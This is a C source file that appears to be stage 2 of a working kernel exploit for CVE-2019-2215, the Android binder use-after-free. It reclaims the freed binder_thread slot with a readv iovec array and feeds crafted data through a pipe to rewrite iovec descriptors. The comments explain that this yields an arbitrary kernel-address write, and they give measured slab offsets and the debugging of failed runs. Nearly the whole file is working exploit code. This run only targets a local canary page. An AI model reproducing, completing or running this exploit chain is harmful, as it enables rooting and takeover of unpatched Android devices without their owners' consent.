#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sched.h>

/* CVE-2019-2215 stage 2, built on the ONE arrangement already proven to poison the slot.
 *
 * tools/broot.c demonstrably mutates the recycled slot while a copy is parked: its decode
 * reported e[4] = 0x10001 (the ticket spinlock went through a lock/unlock cycle) and the
 * delivered window began at 0xffffffc0a3617c50 = slot+0x50 (the head self-linked).  That
 * harness is: open -> mmap -> arm pending tx -> epoll ADD -> fork -> parent does
 * BINDER_THREAD_EXIT then the vector I/O -> child sleeps, does EPOLL_CTL_DEL.
 *
 * broot used writev (pipe source): the poisoned iov_base is read from => the leak.
 * Here the SAME structure is used with readv (pipe destination): the poisoned iov_base is
 * written to => a WRITE of pipe data at an address the kernel itself chose (slot+0x50, i.e.
 * our own in-kernel iovec copy).  Copying into the array lets us rewrite the descriptors of
 * the segments that have not been consumed yet, so the bytes AFTER that chunk land at an
 * address we picked -- arbitrary-address write, no bound from any allocation size (unlike
 * the adsprpc route, where copylen = sum of declared lengths forces fastrpc_buf_alloc to
 * request the whole span, which caps how far `args - offset` can be pushed).
 *
 * Segment map of our array inside the slot (measured):
 *   0x48 = iov[4].iov_len = wait.lock   -> 0 while unlocked, 0x00010001 after the DEL
 *   0x50 = iov[5].iov_base = head.next  -> rewritten by the DEL to slot+0x50
 *   0x58 = iov[5].iov_len  = head.prev  -> rewritten by the DEL to slot+0x50
 *   0x60 = iov[6].iov_base, 0x68 = iov[6].iov_len    <- the chunk re-aims THESE
 * This run only ever aims at our own canary page: the first gate is proving the redirect,
 * not writing anywhere harmful.
 */
#define NS       25
#define BLK      0x2000
#define IDX_LOCK 4
#define IDX_HEAD 5
#define TICKET   0x00010001UL
#define BINDER_THREAD_EXIT 0x40046208u

typedef uint64_t bsize_t;
typedef uint64_t bptr_t;
struct txdata {
    union { uint32_t handle; bptr_t ptr; } target;
    bptr_t cookie; uint32_t code, flags; int32_t spid; uint32_t seuid;
    bsize_t data_size, offsets_size;
    union { struct { bptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
struct bwr { bsize_t write_size, write_consumed, read_buffer_unused; };
struct binder_write_read {
    bsize_t write_size;
    bsize_t write_consumed;
    bptr_t  write_buffer;
    bsize_t read_size;
    bsize_t read_consumed;
    bptr_t  read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct txdata)

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int arm(int fd)
{
    char wb[4 + sizeof(struct txdata)], pl[16], rb[256];
    struct txdata tr;
    struct binder_write_read b, b2;
    uint32_t cmd = BC_TRANSACTION;
    int rc, a;

    memset(pl, 0, sizeof pl);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof pl;
    tr.data.ptr.buffer = (bptr_t)(uintptr_t)pl;
    memcpy(wb, &cmd, 4);
    memcpy(wb + 4, &tr, sizeof tr);
    memset(&b, 0, sizeof b);
    b.write_size = sizeof wb;
    b.write_buffer = (bptr_t)(uintptr_t)wb;
    if (ioctl(fd, BINDER_WRITE_READ, &b))
        return -1;
    for (a = 0; a < 3; a++) {
        size_t off;
        int done = 0, reply = 0;
        memset(rb, 0, sizeof rb);
        memset(&b2, 0, sizeof b2);
        b2.read_size = sizeof rb;
        b2.read_buffer = (bptr_t)(uintptr_t)rb;
        rc = ioctl(fd, BINDER_WRITE_READ, &b2);
        off = 0;
        while (off + 4 <= (size_t)b2.read_consumed) {
            uint32_t c;
            memcpy(&c, rb + off, 4);
            off += 4;
            if (c == 0x7206)
                done = 1;
            else if (c == 0x80407203 || c == 0x80407202) {
                reply = 1;
                off += 64;
            }
        }
        if (rc)
            return -1;
        if (done && !reply)
            return 0;
        if (reply)
            return -1;
    }
    return -1;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 3;
    unsigned char *fill, *canary, *sink;
    struct iovec iov[NS];
    struct epoll_event ev = { .events = EPOLLIN };
    int epfd, r;

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(NS, BLK);
    canary = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    sink = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(canary, 0x33, 0x4000);
    memset(sink, 0x44, 0x4000);
    memset(fill, 0x5A, NS * BLK);
    pin0();
    epfd = epoll_create(16);

    for (r = 0; r < rounds; r++) {
        int pipefd[2], fd, pid, rc;
        unsigned long *chunk;
        unsigned long tag = 0x4C45414B5245444FULL;
        struct iovec *ip;

        fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
        if (fd < 0) { perror("open binder"); return 1; }
        if (mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0) == MAP_FAILED) {
            perror("mmap");
            close(fd);
            return 1;
        }
        if (arm(fd)) { printf("round %d: arm failed\n", r); close(fd); continue; }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll add"); return 1; }

        /* pipe() MUST be created before the free: alloc_pipe_info() kmallocs a
         * pipe_inode_info of ~0x100+ bytes, i.e. from the very same kmalloc-512 slab, and
         * it would take the freed binder_thread slot before our array gets a chance
         * (measured: readv used our ORIGINAL lengths, so nothing had been poisoned). */
        if (pipe(pipefd)) { perror("pipe"); return 1; }
        /* Must exceed the whole staged stream (8+4087+0x10001+4096+8 = 73736 bytes):
         * if a write blocks, pipe_write commits its in-flight page early and the
         * page-alignment the segment advance depends on is lost -- that is what made
         * readv return 65681 instead of consuming the chunk as its own buffer. */
        if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x40000) < 0)
            printf("  F_SETPIPE_SZ failed errno=%d\n", errno);
        else
            printf("  pipe rings = %d\n", fcntl(pipefd[0], F_GETPIPE_SZ));

        memset(iov, 0, sizeof iov);
        /* consume 8 bytes in segment 0 so the walker is provably started, then the lock
         * segment (its iov_len IS the ticket word, 0 now / 0x10001 after the DEL), then
         * segment 5 which the DEL turns into "destination = the array itself". */
        iov[0].iov_base = fill;                       iov[0].iov_len = 8;
        /* 4087 more bytes make the primer write fill exactly one pipe page, so the
         * 0x10001-byte filler below starts and ends on page boundaries -- without that the
         * filler's last buffer keeps 4087 free bytes and pipe_write MERGES the chunk and
         * the payload into one buffer, which is why the previous run copied 136 bytes in a
         * single memcpy and never re-read our rewritten [5].iov_len (canary stayed clean). */
        iov[1].iov_base = fill + BLK;                 iov[1].iov_len = 4087;
        iov[IDX_LOCK].iov_base = fill + 4 * BLK;      iov[IDX_LOCK].iov_len = 0;
        /* readv's total is fixed at import time as SUM(iov_len), so the declared budget
         * here must already cover primer(8) + the 0x10001 bytes the mutated lock word will
         * demand + chunk(128) + payload(8); 0x100 got readv finished at 264 bytes, which is
         * why the earlier run never reached the poisoned segment. */
        iov[IDX_HEAD].iov_base = fill + 3 * BLK;      iov[IDX_HEAD].iov_len = 0x20000;
        iov[6].iov_base = sink;                       iov[6].iov_len = 0;
        for (rc = 0; rc < NS; rc++)
            if (!iov[rc].iov_base)
                iov[rc].iov_base = fill + rc * BLK;

        /* what we will install into the array at slot+0x50:
         *   +0x00 -> iov[5].base,  +0x08 -> iov[5].len (= chunk size, so the walker stops
         *   at iov[6] with offset 0),  +0x10 -> iov[6].base = CANARY (the redirect),
         *   +0x18 -> iov[6].len = 8,   the rest zero. */
        chunk = (unsigned long *)calloc(1, 4096);
        /* the walker is inside segment [5] whose len the kernel rewrote to a pointer value; installing 4096 here makes skip==iov_len true at the end of THIS buffer's memcpy, so the
         * iterator advances to iov[6] before the payload write is copied. */
        chunk[0] = (unsigned long)fill + 2 * BLK;
        chunk[1] = 4096;
        chunk[2] = (unsigned long)canary;
        chunk[3] = 8;   /* iov[6].iov_len = payload size */

        pid = fork();
        if (pid < 0) { perror("fork"); return 1; }
        if (pid == 0) {
            size_t left = TICKET;
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            close(pipefd[0]);
            sleep(1);
            if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
                perror("child DEL");
            printf("CHILD: DEL ok, writing primer 8\n"); fflush(stdout);
            if (write(pipefd[1], "12345678", 8) != 8)
                perror("child primer");
            printf("CHILD: writing pad 4087\n"); fflush(stdout);
            if (write(pipefd[1], fill, 4087) != 4087)
                perror("child pad");
            printf("CHILD: writing ticket filler\n"); fflush(stdout);
            while (left) {
                size_t n = left > 0x4000 ? 0x4000 : left;
                if (write(pipefd[1], fill, n) != (ssize_t)n) { perror("child filler"); break; }
                left -= n;
            }
            printf("CHILD: writing chunk page\n"); fflush(stdout);
            if (write(pipefd[1], chunk, 4096) != 4096)
                perror("child chunk");
            printf("CHILD: writing payload\n"); fflush(stdout);
            if (write(pipefd[1], &tag, 8) != 8)
                perror("child payload");
            close(pipefd[1]);
            _exit(0);
        }
        close(pipefd[1]);

        /* the free is now the last thing before the readv's kmalloc(400): fork is already
         * done, and the child is asleep for a second so it allocates nothing in this
         * window -- deterministic slot handover on the same CPU. */
        if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("THREAD_EXIT"); return 1; }

        memset(iov + 7, 0, sizeof(iov[0]) * (NS - 7));
        for (rc = 7; rc < NS; rc++)
            iov[rc].iov_base = fill + rc * BLK;
        ip = iov;
        {
            size_t sum = 0;
            for (rc = 0; rc < NS; rc++)
                sum += iov[rc].iov_len;
            printf("  pre-readv: sum(iov_len)=%zu  [4].len=%zu [5].base=%p [5].len=%zx [6].base=%p [6].len=%zu\n",
                   sum, iov[IDX_LOCK].iov_len, iov[IDX_HEAD].iov_base,
                   iov[IDX_HEAD].iov_len, iov[6].iov_base, iov[6].iov_len);
        }
        errno = 0;
        rc = readv(pipefd[0], ip, NS);
        printf("  readv -> %d errno=%d\n", rc, errno);
        close(pipefd[0]);
        {
            int st = 0;
            waitpid(pid, &st, 0);
        }
        close(fd);
        {
            int j, hits = 0;
            unsigned long *c = (unsigned long *)canary;
            for (j = 0; j < 512; j++)
                if (c[j] != 0x3333333333333333UL)
                    hits++;
            printf("  canary words changed=%d  [0]=%016lx  [1]=%016lx  tag=%016lx\n",
                   hits, c[0], c[1], tag);
            if (c[0] == tag)
                printf("  *** REDIRECT PROVEN: data landed at an address we installed ***\n");
        }
        if (canary[0] == 0x4C)
            break;
    }
    return 0;
}
